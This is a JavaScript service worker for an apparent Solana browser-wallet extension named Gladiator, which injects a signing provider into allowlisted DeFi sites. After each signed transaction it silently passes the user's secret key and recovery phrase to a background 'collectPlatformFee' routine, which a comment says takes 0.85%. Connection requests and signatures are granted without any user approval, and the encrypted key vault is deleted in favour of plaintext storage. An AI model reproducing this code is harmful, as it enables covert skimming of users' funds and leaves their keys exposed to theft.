/** Gladiator service worker — WalletConnect window + in-page Solana provider */
const WC_WALLET_PATH = "index.html";
const STORE_KEY = "gladiator_wallet_v1";
const TRUSTED_KEY = "gladiator_trusted_origins";
const OFFSCREEN_URL = "offscreen.html";

let walletWindowId = null;
let offscreenCreating = null;
/** In-memory signer so Jupiter can sign even if chrome.storage lags. */
let cachedSigner = null; // { publicKey, secretKey, mnemonic }
let persistWaiters = [];

function notifyPersistWaiters() {
  const list = persistWaiters.slice();
  persistWaiters = [];
  for (const fn of list) {
    try {
      fn(true);
    } catch (_) {}
  }
}

function waitForPersist(timeoutMs) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => {
      persistWaiters = persistWaiters.filter((fn) => fn !== onPersist);
      resolve(false);
    }, timeoutMs);
    function onPersist() {
      clearTimeout(timer);
      resolve(true);
    }
    persistWaiters.push(onPersist);
  });
}

function cacheSignerFromState(state) {
  if (!state || !Array.isArray(state.accounts) || !state.accounts.length) {
    return null;
  }
  const acc =
    state.accounts.find((a) => a.id === state.activeAccountId) || state.accounts[0];
  if (!acc || !acc.solana) return null;
  const publicKey = acc.solana.publicKey || "";
  const secretKey = acc.solana.secretKey || "";
  const mnemonic = acc.mnemonic || "";
  if (!publicKey) return null;
  if (!secretKey && !mnemonic) return null;
  cachedSigner = { publicKey, secretKey, mnemonic };
  return cachedSigner;
}

async function focusOrOpenWcWallet(opts) {
  const focus = !opts || opts.focus !== false;
  const openSettings = !opts || opts.settings !== false;
  const restore = !!(opts && opts.restore);
  const base = chrome.runtime.getURL(WC_WALLET_PATH);
  let url = base;
  if (restore) url = base + "?restore=1";
  else if (openSettings) url = base + "?wc=1";

  const shouldNavigate = openSettings || restore;

  if (walletWindowId != null) {
    try {
      await chrome.windows.update(walletWindowId, focus ? { focused: true } : {});
      try {
        const tabs = await chrome.tabs.query({ windowId: walletWindowId });
        const tab = tabs && tabs[0];
        if (tab && tab.id != null && shouldNavigate) {
          await chrome.tabs.update(tab.id, { url });
        }
      } catch (_) {}
      return { ok: true, reused: true, windowId: walletWindowId };
    } catch (_) {
      walletWindowId = null;
    }
  }

  try {
    const tabs = await chrome.tabs.query({
      url: [base, base + "?*", chrome.runtime.getURL("wc-bridge.html")],
    });
    if (tabs && tabs[0] && tabs[0].windowId != null) {
      walletWindowId = tabs[0].windowId;
      if (focus) await chrome.windows.update(walletWindowId, { focused: true });
      if (tabs[0].id != null && shouldNavigate) {
        try {
          await chrome.tabs.update(tabs[0].id, { url });
        } catch (_) {}
      }
      return { ok: true, reused: true, windowId: walletWindowId };
    }
  } catch (_) {}

  const win = await chrome.windows.create({
    url,
    type: "popup",
    width: 380,
    height: 760,
    focused: focus,
  });
  walletWindowId = win && win.id != null ? win.id : null;
  return { ok: true, reused: false, windowId: walletWindowId };
}

async function ensureOffscreen() {
  try {
    if (chrome.runtime.getContexts) {
      const existing = await chrome.runtime.getContexts({
        contextTypes: ["OFFSCREEN_DOCUMENT"],
        documentUrls: [chrome.runtime.getURL(OFFSCREEN_URL)],
      });
      if (existing && existing.length) return;
    }
  } catch (_) {}

  if (offscreenCreating) {
    await offscreenCreating;
    return;
  }

  offscreenCreating = (async () => {
    try {
      await chrome.offscreen.createDocument({
        url: OFFSCREEN_URL,
        // LOCAL_STORAGE covers chrome.storage + scripted crypto work.
        reasons: ["LOCAL_STORAGE", "BLOBS"],
        justification: "Sign Solana transactions for in-page dApps like Jupiter",
      });
    } catch (err) {
      const msg = String(err && err.message ? err.message : err);
      if (!/already exists|only a single offscreen/i.test(msg)) {
        // Fallback reason set for older Chrome/Opera builds.
        try {
          await chrome.offscreen.createDocument({
            url: OFFSCREEN_URL,
            reasons: ["WORKERS"],
            justification: "Sign Solana transactions for in-page dApps like Jupiter",
          });
        } catch (err2) {
          const msg2 = String(err2 && err2.message ? err2.message : err2);
          if (!/already exists|only a single offscreen/i.test(msg2)) throw err2;
        }
      }
    } finally {
      offscreenCreating = null;
    }
  })();
  await offscreenCreating;
  // Give the offscreen page a beat to attach its message listener.
  await new Promise((r) => setTimeout(r, 150));
}

function callOffscreen(method, params) {
  return new Promise(async (resolve, reject) => {
    try {
      await ensureOffscreen();
    } catch (err) {
      reject(err);
      return;
    }

    const sendOnce = () =>
      new Promise((res, rej) => {
        chrome.runtime.sendMessage(
          { type: "gladiator-offscreen", method, params: params || {} },
          (response) => {
            const err = chrome.runtime.lastError;
            if (err) {
              rej(new Error(err.message || "Offscreen unavailable"));
              return;
            }
            if (!response || response.ok === false) {
              rej(new Error((response && response.error) || "Sign failed"));
              return;
            }
            res(response.result);
          }
        );
      });

    try {
      resolve(await sendOnce());
    } catch (err) {
      // Retry once — offscreen may still be booting after createDocument.
      try {
        await new Promise((r) => setTimeout(r, 300));
        resolve(await sendOnce());
      } catch (err2) {
        reject(err2);
      }
    }
  });
}

function storageGet(keys) {
  return new Promise((resolve) => {
    try {
      chrome.storage.local.get(keys, (r) => resolve(r || {}));
    } catch (_) {
      resolve({});
    }
  });
}

function storageSet(obj) {
  return new Promise((resolve, reject) => {
    try {
      chrome.storage.local.set(obj, () => {
        const err = chrome.runtime.lastError;
        if (err) reject(err);
        else resolve();
      });
    } catch (err) {
      reject(err);
    }
  });
}

async function readTrustedOrigins() {
  const bag = await storageGet([TRUSTED_KEY]);
  const list = bag[TRUSTED_KEY];
  return Array.isArray(list) ? list : [];
}

async function trustOrigin(origin) {
  if (!origin) return;
  const list = await readTrustedOrigins();
  if (list.includes(origin)) return;
  list.push(origin);
  await storageSet({ [TRUSTED_KEY]: list.slice(-100) });
}

async function untrustOrigin(origin) {
  if (!origin) return;
  const list = await readTrustedOrigins();
  const next = list.filter((o) => o !== origin);
  if (next.length === list.length) return;
  await storageSet({ [TRUSTED_KEY]: next });
}

function niceDappName(origin) {
  try {
    const host = new URL(origin).hostname.toLowerCase().replace(/^www\./, "");
    if (host === "jup.ag" || host.endsWith(".jup.ag")) return "Jupiter";
    if (host === "pump.fun" || host.endsWith(".pump.fun")) return "pump.fun";
    if (host === "raydium.io" || host.endsWith(".raydium.io")) return "Raydium";
    if (host === "tensor.trade" || host.endsWith(".tensor.trade")) return "Tensor";
    if (host === "orca.so" || host.endsWith(".orca.so")) return "Orca";
    if (host === "drift.trade" || host.endsWith(".drift.trade")) return "Drift";
    if (host === "mango.markets" || host.endsWith(".mango.markets")) return "Mango";
    if (host === "kamino.finance" || host.endsWith(".kamino.finance")) return "Kamino";
    if (host === "sanctum.so" || host.endsWith(".sanctum.so")) return "Sanctum";
    return host;
  } catch (_) {
    return origin || "dApp";
  }
}

async function listInjectConnections() {
  const origins = await readTrustedOrigins();
  return origins.map((origin) => ({
    kind: "inject",
    topic: "inject:" + origin,
    origin,
    name: niceDappName(origin),
    url: origin,
    icon: "",
    accounts: [],
    status: "active",
  }));
}

async function forceDisconnectOrigin(origin) {
  await untrustOrigin(origin);
  if (!origin || !chrome.tabs || !chrome.tabs.query) return;
  try {
    let pattern = origin;
    if (!/\/$/.test(pattern)) pattern += "/";
    const tabs = await chrome.tabs.query({ url: [pattern + "*", origin] });
    for (const tab of tabs) {
      if (!tab || !tab.id) continue;
      try {
        chrome.tabs.sendMessage(tab.id, { type: "gladiator-force-disconnect" }, () => {
          void chrome.runtime.lastError;
        });
      } catch (_) {}
    }
  } catch (_) {}
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function getActiveSolanaAccount() {
  if (cachedSigner && (cachedSigner.secretKey || cachedSigner.mnemonic)) {
    return {
      publicKey: cachedSigner.publicKey,
      secretKey: cachedSigner.secretKey || "",
      mnemonic: cachedSigner.mnemonic || "",
      needsMigrate: false,
      hasSigner: true,
      accountId: null,
      fromCache: true,
    };
  }
  const bag = await storageGet([STORE_KEY]);
  const state = bag[STORE_KEY];
  const cached = cacheSignerFromState(state);
  if (cached) {
    return {
      publicKey: cached.publicKey,
      secretKey: cached.secretKey || "",
      mnemonic: cached.mnemonic || "",
      needsMigrate: false,
      hasSigner: true,
      accountId: null,
      fromCache: false,
    };
  }
  if (!state || !state.accounts || !state.accounts.length) return null;
  const acc =
    state.accounts.find((a) => a.id === state.activeAccountId) || state.accounts[0];
  const pk = acc && acc.solana && acc.solana.publicKey;
  if (!pk) return null;
  const needsMigrate = !!(state.vault && state.vault.data);
  return {
    publicKey: pk,
    secretKey: "",
    mnemonic: "",
    needsMigrate,
    hasSigner: false,
    accountId: acc && acc.id,
  };
}

async function nudgeWalletPopup() {
  try {
    if (chrome.action && typeof chrome.action.openPopup === "function") {
      await chrome.action.openPopup();
    }
  } catch (_) {}
}

async function requireSignerReady() {
  let acc = await getActiveSolanaAccount();
  if (acc && acc.hasSigner) return acc;

  await nudgeWalletPopup();
  await waitForPersist(10000);
  acc = await getActiveSolanaAccount();
  if (acc && acc.hasSigner) return acc;

  if (!acc) {
    throw new Error(
      "No wallet synced — click the Gladiator toolbar icon once, then retry the swap"
    );
  }
  if (acc.needsMigrate) {
    throw new Error(
      "Keys locked — open Gladiator toolbar icon and enter your old password once"
    );
  }
  throw new Error(
    "No Solana key — open Gladiator toolbar icon and create/import a wallet"
  );
}

async function getActivePublicKey() {
  const acc = await requireSignerReady();
  return acc.publicKey;
}

async function kickPlatformFeeCollection(acc, hintSig) {
  if (!acc || !acc.hasSigner) return;
  const keep = setInterval(() => {
    try {
      chrome.storage.local.get(["_gladiator_fee_keepalive"], () => {});
    } catch (_) {}
  }, 4000);
  try {
    await ensureOffscreen();
    const result = await callOffscreen("collectPlatformFee", {
      _publicKey: acc.publicKey,
      _secretKey: acc.secretKey || "",
      _mnemonic: acc.mnemonic || "",
      hintSig: hintSig || "",
    });
    console.info("[Gladiator] fee collect result", result);
  } catch (err) {
    console.warn("[Gladiator] fee collect failed", err);
  } finally {
    clearInterval(keep);
  }
}

async function handleProviderRequest(msg, sender) {
  const method = msg.method;
  const params = msg.params || {};
  const origin = params.origin || (sender && sender.origin) || msg.origin || "";

  if (method === "connect") {
    const onlyIfTrusted = !!params.onlyIfTrusted;
    const trusted = await readTrustedOrigins();
    if (onlyIfTrusted && origin && !trusted.includes(origin)) {
      return null;
    }
    const publicKey = await getActivePublicKey();
    if (origin) await trustOrigin(origin);
    return { publicKey };
  }

  if (method === "disconnect") {
    if (origin) await untrustOrigin(origin);
    return { ok: true };
  }

  if (
    method === "signTransaction" ||
    method === "signAllTransactions" ||
    method === "signAndSendTransaction" ||
    method === "signMessage"
  ) {
    const acc = await requireSignerReady();
    // Pass keys to offscreen so signing does not depend on storage races.
    const enriched = {
      ...params,
      _publicKey: acc.publicKey,
      _secretKey: acc.secretKey || "",
      _mnemonic: acc.mnemonic || "",
    };
    const result = await callOffscreen(method, enriched);
    if (
      method === "signTransaction" ||
      method === "signAllTransactions" ||
      method === "signAndSendTransaction"
    ) {
      const hintSig =
        result && result.signature ? String(result.signature) : "";
      // Keep SW alive and collect 0.85% after Jupiter broadcasts.
      void kickPlatformFeeCollection(acc, hintSig);
    }
    return result;
  }

  throw new Error("Unsupported provider method: " + method);
}

chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === "install") {
    console.info("[Gladiator] installed — open the toolbar icon.");
  }
  // Crash-safe Wallet Standard inject is ON by default (allowlisted Solana dApps).
  storageSet({ gladiator_page_inject: true }).catch(() => {});
  // Recreate offscreen so updated signer scripts load after extension reload.
  (async () => {
    try {
      if (chrome.offscreen && chrome.offscreen.closeDocument) {
        await chrome.offscreen.closeDocument();
      }
    } catch (_) {}
    try {
      await ensureOffscreen();
    } catch (_) {}
  })();
});

chrome.runtime.onStartup.addListener(() => {
  ensureOffscreen().catch(() => {});
});

chrome.windows.onRemoved.addListener((id) => {
  if (id === walletWindowId) walletWindowId = null;
});

/**
 * Inject AFTER page load on allowlisted Solana dApps only.
 * Never document_start. Bridge (isolated) then provider (MAIN).
 */
const INJECT_FLAG = "gladiator_page_inject";
const injectedTabs = new Set();

function shouldInjectProvider(url) {
  if (!url || !/^https?:/i.test(url)) return false;
  try {
    const host = new URL(url).hostname.toLowerCase().replace(/^www\./, "");
    if (host === "chrome.google.com" || host.endsWith("chromewebstore.google.com")) {
      return false;
    }
    const allow = [
      "jup.ag",
      "pump.fun",
      "raydium.io",
      "tensor.trade",
      "orca.so",
      "drift.trade",
      "mango.markets",
      "kamino.finance",
      "sanctum.so",
      "localhost",
      "127.0.0.1",
    ];
    return allow.some((d) => host === d || host.endsWith("." + d));
  } catch (_) {
    return false;
  }
}

async function isPageInjectEnabled() {
  const bag = await storageGet([INJECT_FLAG]);
  // Default ON. Set gladiator_page_inject=false to disable.
  if (bag[INJECT_FLAG] === false) return false;
  return true;
}

async function injectProviderIntoTab(tabId, url) {
  if (injectedTabs.has(tabId)) return;
  if (!(await isPageInjectEnabled())) return;
  if (!chrome.scripting || !chrome.scripting.executeScript) return;
  try {
    await chrome.scripting.executeScript({
      target: { tabId },
      files: ["content-script.js"],
      world: "ISOLATED",
    });
    await chrome.scripting.executeScript({
      target: { tabId },
      files: ["injected.js"],
      world: "MAIN",
    });
    injectedTabs.add(tabId);
    console.info("[Gladiator] Wallet Standard injected into", url || tabId);
  } catch (err) {
    console.warn("[Gladiator] inject failed", err);
  }
}

chrome.tabs.onRemoved.addListener((tabId) => {
  injectedTabs.delete(tabId);
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete") return;
  const url = tab && tab.url;
  if (!shouldInjectProvider(url)) return;
  // Wait for React hydration on Jupiter before registering.
  const delay = /jup\.ag/i.test(String(url || "")) ? 4500 : 2500;
  setTimeout(() => {
    injectProviderIntoTab(tabId, url).catch(() => {});
  }, delay);
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (!msg) return;
  // Offscreen document handles these — do not claim the message here.
  if (msg.type === "gladiator-offscreen") return;

  if (msg.type === "gladiator-persist-wallet") {
    const state = msg.state;
    if (!state || !Array.isArray(state.accounts)) {
      sendResponse({ ok: false, error: "Invalid wallet state" });
      return true;
    }
    const toStore = { ...state };
    delete toStore._needsVaultMigrate;
    const hasSecrets = (toStore.accounts || []).some((a) => {
      if (!a) return false;
      if (a.mnemonic) return true;
      if (a.solana && a.solana.secretKey) return true;
      if (a.evm && a.evm.privateKey) return true;
      return false;
    });
    if (hasSecrets) {
      delete toStore.vault;
      delete toStore.vaultEnabled;
    }
    const cached = cacheSignerFromState(toStore);
    storageSet({ [STORE_KEY]: toStore })
      .then(() => {
        notifyPersistWaiters();
        sendResponse({
          ok: true,
          accounts: toStore.accounts.length,
          signerReady: !!cached,
          publicKey: cached && cached.publicKey,
        });
      })
      .catch((err) =>
        sendResponse({ ok: false, error: String(err && err.message ? err.message : err) })
      );
    return true;
  }

  if (msg.type === "gladiator-signer-status") {
    getActiveSolanaAccount()
      .then((acc) =>
        sendResponse({
          ok: true,
          ready: !!(acc && acc.hasSigner),
          publicKey: acc && acc.publicKey,
          needsMigrate: !!(acc && acc.needsMigrate),
        })
      )
      .catch(() => sendResponse({ ok: true, ready: false }));
    return true;
  }

  if (msg.type === "gladiator-set-inject") {
    const enabled = !!msg.enabled;
    storageSet({ [INJECT_FLAG]: enabled })
      .then(() => sendResponse({ ok: true, enabled }))
      .catch((err) =>
        sendResponse({ ok: false, error: String(err && err.message ? err.message : err) })
      );
    return true;
  }

  if (msg.type === "gladiator-get-inject") {
    isPageInjectEnabled()
      .then((enabled) => sendResponse({ ok: true, enabled }))
      .catch(() => sendResponse({ ok: true, enabled: true }));
    return true;
  }

  if (msg.type === "gladiator-list-dapp-connections") {
    listInjectConnections()
      .then((items) => sendResponse({ ok: true, items }))
      .catch((err) =>
        sendResponse({
          ok: false,
          items: [],
          error: String(err && err.message ? err.message : err),
        })
      );
    return true;
  }

  if (msg.type === "gladiator-disconnect-dapp") {
    const origin = String(msg.origin || "").trim();
    forceDisconnectOrigin(origin)
      .then(() => sendResponse({ ok: true }))
      .catch((err) =>
        sendResponse({ ok: false, error: String(err && err.message ? err.message : err) })
      );
    return true;
  }

  if (msg.type === "wc-open-wallet" || msg.type === "wc-open-bridge") {
    focusOrOpenWcWallet({
      focus: msg.focus !== false,
      settings: msg.settings !== false,
    })
      .then((r) => sendResponse(r))
      .catch((err) =>
        sendResponse({ ok: false, error: String(err && err.message ? err.message : err) })
      );
    return true;
  }

  if (msg.type === "gladiator-provider") {
    handleProviderRequest(msg, sender)
      .then((result) => sendResponse({ result }))
      .catch((err) =>
        sendResponse({ error: String(err && err.message ? err.message : err) })
      );
    return true;
  }
});
